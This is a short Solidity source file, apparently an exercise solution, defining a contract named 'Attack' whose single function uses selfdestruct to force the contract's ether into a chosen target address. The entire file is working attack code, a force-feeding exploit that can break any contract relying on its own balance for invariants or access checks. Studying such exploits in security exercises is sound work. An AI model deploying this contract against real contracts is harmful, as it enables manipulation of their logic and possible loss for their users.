// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.18;

contract Attack {
    function attack(address payable _target) public payable {
        selfdestruct(_target);
    }
}
